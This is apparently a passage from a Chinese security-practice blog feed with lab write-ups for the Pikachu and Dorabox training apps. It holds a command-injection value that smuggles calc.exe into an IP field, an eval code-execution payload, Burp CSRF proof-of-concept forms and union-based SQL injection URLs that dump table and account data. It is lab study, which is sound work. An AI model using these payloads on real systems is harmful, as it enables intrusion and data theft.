&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ipaddress=jsdlvfdsfger | C:\Windows\System32\calc.exe&amp;amp;submit=ping&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功弹出&lt;/p&gt;
&lt;h2 id=&#34;execeval&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#execeval&#34;&gt;#&lt;/a&gt; exec&amp;quot;eval&amp;quot;&lt;/h2&gt;
&lt;h3 id=&#34;过程-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-16&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;随便输一串字符串 phpinfo ()，报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Parse error: syntax error, unexpected end of file in D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php(19) : eval()&amp;#x27;d code on line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后来百度发现：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;php 的 eval 函数是用来把一段文字当作一段 php 的脚本来执行，这样做的好处是我们可以动态修改 php 执行的内容。&lt;/p&gt;
&lt;p&gt;今天想实现的功能是：根据从浏览器 get 到的数据，使用 eval () 执行不同的函数：&lt;br&gt;
if(isset(_GET[&#39;step&#39;])){
eval(_GET[‘step’]);&lt;br&gt;
}else{&lt;br&gt;
content=&#39;\&lt;a href=&#34;?step=getipall&#34;&gt;第一步：获取所有的ip地址\&lt;/a&gt;&#39;;
msg(content);&lt;br&gt;
}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意，这个代码是有安全问题的，千万不要在生产环境中使用。&lt;/p&gt;
&lt;p&gt;运行以上代码，提示 “eval ()’d code on line 1”，根据提示来看是 eval 函数在执行的时候出错了。&lt;/p&gt;
&lt;p&gt;第一反应就是 google，结果得到的都是其他成品程序出现了这个错误。这时候还得去翻 php 手册，根据手册的描述：eval 所执行的字符串，也得必须满足 php 的语法要求，很明显我的字符串里面缺少了括号和最后的分号。&lt;/p&gt;
&lt;p&gt;所以满足语法规则，payload 更改为 phpinfo (); 即可&lt;/p&gt;
&lt;p&gt;这真的是白给&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;(1)  ;&lt;/p&gt;
&lt;p&gt;分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。&lt;/p&gt;
&lt;p&gt;(2) ||&lt;/p&gt;
&lt;p&gt;逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。&lt;/p&gt;
&lt;p&gt;(3) &amp;amp;&amp;amp;&lt;/p&gt;
&lt;p&gt;逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。&lt;/p&gt;
&lt;p&gt;(4) |&lt;/p&gt;
&lt;p&gt;管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。&lt;/p&gt;
&lt;p&gt;例 ls | grep *.txt&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h1&gt;
&lt;h2 id=&#34;csrfget&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrfget&#34;&gt;#&lt;/a&gt; csrf(get)&lt;/h2&gt;
&lt;h3 id=&#34;过程-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-17&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;poc 在 bp 上抓 request 包，自动生成：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-csrf-001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;poc，在里面修改你要改的值:&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;&amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;history.pushState(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;sex&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hehe&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;phonenum&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;123&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;add&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hehe&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;12345678&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#64;&lt;/span&gt;&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Submit request&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发给用户点击按钮后跳转：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pikachu-csrf-002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改成功&lt;/p&gt;
&lt;h2 id=&#34;csrfpost&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrfpost&#34;&gt;#&lt;/a&gt; csrf（post）&lt;/h2&gt;
&lt;h3 id=&#34;过程-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-18&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;和 get 相比，就是 action 后面加了个 method=“POST”，然后就是一样的操作了&lt;/p&gt;
&lt;p&gt;poc：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;&amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;history.pushState(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;sex&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;phonenum&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;add&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Submit request&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;csrftoken没绕过去可以用bp绕把&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrftoken没绕过去可以用bp绕把&#34;&gt;#&lt;/a&gt; csrf (token)（没绕过去？可以用 bp 绕把）&lt;/h2&gt;
&lt;h3 id=&#34;过程-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-19&#34;&gt;#&lt;/a&gt; 过程&lt;/h3&gt;
&lt;p&gt;没绕过去，下面有个服务器给的隐藏的 token&lt;/p&gt;
&lt;p&gt;（这里可以利用 bp 自带的功能，将返回数据包中的 token 数据设置为下一请求数据包的参数）&lt;/p&gt;
&lt;h3 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结：&lt;/h3&gt;
&lt;p&gt;总结之不知道自己当时在想什么导致只能浑水摸鱼系列◔ ‸◔&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;最后想说的话&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后想说的话&#34;&gt;#&lt;/a&gt; 最后想说的话&lt;/h2&gt;
&lt;p&gt;只要花时间去努力，真的会变强的！！！&lt;/p&gt;
&lt;p&gt;看见自己以前写的文章，莫名落泪&lt;/p&gt;
&lt;p&gt;。&lt;/p&gt;
&lt;p&gt;突然想接一个不明觉厉ヽ (✿ﾟ▽ﾟ) ノ&lt;/p&gt;
&lt;p&gt;突然伤感氛围打破&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/</guid>
            <title>dorabox冒险手记</title>
            <link>http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/</link>
            <category>dorabox,靶场练习</category>
            <pubDate>Thu, 15 Oct 2020 16:40:33 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sqli字符型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli字符型&#34;&gt;#&lt;/a&gt; SQLi 字符型&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;字符型和数字型相比，就是要闭合单引号吧&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;单引号闭合，# 用 url 编码 %23：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; or 1=1 %23&#39; &amp;amp;submit=submit&lt;/code&gt; &lt;img src=&#34;dorabox_sqlchar002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面就是和数字型注入相同的操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 order by 或者 group by 判断字段数：&lt;/p&gt;
&lt;p&gt;正常： &lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; or 1=1 order by 3 %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;报错： &lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php&lt;/code&gt; &lt;br&gt;
?title=1’ or 1=1 order by 4 %23’&lt;br&gt;
&amp;amp;submit=submit&lt;/p&gt;
&lt;p&gt;以上说明需要 3 个字段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆该数据库所有表和 news 表有多少条数据&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; union select  1,(select table_rows from information_schema.tables where table_name=&#39;news&#39; and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为没有 title 为’1’的文章，所以直接只会出后面攻击所得数据&lt;img src=&#34;dorabox_sqlchar003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;注入的三个字段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;1 并不会输出，所以随意&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(select table_rows from information_schema.tables where table_name=‘news’ and table_schema = database ()) ，用于统计该表的数据数量，没什么用，就是想试试看&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(select group_concat (table_name) from information_schema.tables where table_schema = database ())，利用 group_concat () 拼接字符串爆表名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆字段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = &#39;account&#39; and table_schema = database() %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlchar004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_string.php ?title=1&#39; union  select 1, 2,concat_ws(&#39;-&#39;,id,rest,own) from account %23&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlchar005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;在 sql 注入中，注释常用’–+’，而注释符’#‘和’–&#39; 一般不能直接使用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘#’：sql 手工注入时，浏览器地址栏输入的 &#39;＃&#39; 并没有发送到后台，因为 url 中 #号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，# 的 url 编码是 %23，替换后可行&lt;/li&gt;
&lt;li&gt;‘–’：在字符型注入时，–和单引号连接在一起时，无法形成有效的 mysql 语句，可能造成单引号未闭合错误。所以可以使用–’，也可以尝试用多行注释符（块注释符 /**/）、一对英文括号、换行符或加号来代替空格&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sqli搜索型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli搜索型&#34;&gt;#&lt;/a&gt; SQLi 搜索型&lt;/h1&gt;
&lt;p&gt;类似字符型注入，主要就是闭合&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;进行闭合&lt;/p&gt;
